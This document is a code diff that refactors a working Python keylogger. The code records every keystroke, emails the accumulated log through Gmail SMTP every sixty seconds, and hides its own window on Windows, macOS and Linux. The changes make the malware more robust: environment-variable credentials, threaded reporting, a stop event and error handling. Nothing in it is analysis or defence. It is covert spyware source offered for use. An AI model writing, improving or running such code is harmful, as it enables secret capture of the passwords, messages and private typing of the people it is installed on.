@@ -7,17 +7,18 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 import platform
 
-EMAIL_ADDRESS = "YOUR_EMAIL"
-EMAIL_PASSWORD = "YOUR_PASSWORD"
-SEND_REPORT_EVERY = 60  # in second
+EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
+EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
+SEND_REPORT_EVERY = 60  # seconds
 
 class KeyLogger:
     def __init__(self, email, password):
         self.log = ""
         self.email = email
         self.password = password
+        self.stop_event = threading.Event()
 
-    def appendlog(self, string):
+    def append_log(self, string):
         self.log += string
 
     def on_press(self, key):
@@ -29,69 +30,78 @@ class KeyLogger:
             elif key == key.esc:
                 current_key = "ESC"
             else:
-                current_key = " " + str(key) + " "
-
-        self.appendlog(current_key)
+                current_key = f" [{str(key)}] "
+        self.append_log(current_key)
 
     def send_mail(self, message):
-        sender = self.email
-        receiver = self.email
-
         msg = MIMEMultipart()
-        msg['From'] = sender
-        msg['To'] = receiver
-        msg['Subject'] = "Keylogger Raporu"
+        msg['From'] = self.email
+        msg['To'] = self.email
+        msg['Subject'] = "Keylogger Report"
+        msg.attach(MIMEText(message, 'plain'))
 
-        body = message
-        msg.attach(MIMEText(body, 'plain'))
-
-        with smtplib.SMTP("smtp.gmail.com", 587) as server:
-            server.starttls()
-            server.login(self.email, self.password)
-            server.sendmail(sender, receiver, msg.as_string())
+        try:
+            with smtplib.SMTP("smtp.gmail.com", 587) as server:
+                server.starttls()
+                server.login(self.email, self.password)
+                server.sendmail(self.email, self.email, msg.as_string())
+        except Exception as e:
+            print(f"Failed to send email: {e}")
 
     def report(self):
-        self.send_mail(self.log)
-        self.log = ""
-        timer = threading.Timer(SEND_REPORT_EVERY, self.report)
-        timer.start()
+        while not self.stop_event.is_set():
+            if self.log:
+                self.send_mail(self.log)
+                self.log = ""
+            self.stop_event.wait(SEND_REPORT_EVERY)
+
+    def start_listener(self):
+        with keyboard.Listener(on_press=self.on_press) as listener:
+            listener.join()
 
     def start(self):
-        keyboard_listener = keyboard.Listener(on_press=self.on_press)
-        with keyboard_listener:
-            self.report()
-            keyboard_listener.join()
+        threading.Thread(target=self.report, daemon=True).start()
+        listener_thread = threading.Thread(target=self.start_listener)
+        listener_thread.daemon = True
+        listener_thread.start()
+        listener_thread.join()
 
-# Check to work on other operating systems
+    def stop(self):
+        self.stop_event.set()
+
+# OS-specific hiding logic
 if platform.system() == "Windows":
     import win32gui
     import win32con
 
     def hide_program():
         the_program_to_hide = win32gui.GetForegroundWindow()
-        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE) # Here is the appropriate obfuscation code for Windows
+        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)
 
-elif platform.system() == "Darwin":  # for MacOS
+elif platform.system() == "Darwin":  # macOS
     def hide_program():
-        os.system("osascript -e 'tell app \"Finder\" to set visible of process \"Python\" to false'")  # Here is the appropriate obfuscation code for MacOS
-        pass
-    
-elif platform.system() == "Linux":  # for Linux
+        os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Terminal\" to false'")
+
+
+elif platform.system() == "Linux":  # Linux
     def hide_program():
-        os.system("xdotool getactivewindow windowminimize")  # Here is the appropriate obfuscation code for Linux
-        pass
+        os.system("xdotool getactivewindow windowminimize")
 else:
-    raise Exception("This operating system is not supported")
-
-def on_show(window):
-    hide_program()
+    def hide_program():
+        print("OS not supported for hiding program.")
 
 if __name__ == "__main__":
-    keylogger = KeyLogger(EMAIL_ADDRESS, EMAIL_PASSWORD)
-    keylogger_thread = threading.Thread(target=keylogger.start)
-    keylogger_thread.start()
-    hide_program()
-    # Minimize Window
-    win32gui.ShowWindow(window, win32con.SW_MINIMIZE)
-    win32gui.EnumWindows(on_show, 0)
-    sys.exit()
+    try:
+        keylogger = KeyLogger(EMAIL_ADDRESS, EMAIL_PASSWORD)
+        keylogger_thread = threading.Thread(target=keylogger.start)
+        keylogger_thread.daemon = True
+        keylogger_thread.start()
+
+        hide_program()
+
+        while True:
+            pass  # Keep the main thread alive
+    except KeyboardInterrupt:
+        keylogger.stop()
+        print("Keylogger terminated.")
+        sys.exit(0)
